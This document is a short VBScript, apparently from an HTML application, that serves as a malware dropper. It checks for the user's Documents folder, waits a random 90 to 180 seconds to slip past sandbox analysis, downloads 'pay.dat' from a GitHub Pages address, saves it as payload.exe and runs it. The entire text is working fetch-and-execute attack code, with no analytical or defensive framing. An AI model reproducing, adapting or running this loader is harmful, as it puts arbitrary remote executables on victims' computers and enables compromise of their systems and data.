Dim sh, http, stream, docPath, exePath, sleepMs, randVal
Set sh = CreateObject("WScript.Shell")
docPath = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents\"
If CreateObject("Scripting.FileSystemObject").FolderExists(docPath) = False Then
    window.close
End If
exePath = docPath & "payload.exe"

Randomize
sleepMs = (90 + Int(Rnd * (180 - 90 + 1))) * 1000
WScript.Sleep sleepMs

On Error Resume Next
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "GET", "https://azamcorps216-debug.github.io/authenticated/assets/pay.dat", False
http.Send
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write http.ResponseBody
stream.SaveToFile exePath, 2
stream.Close

sh.Run """" & exePath & """", 1, False
window.close
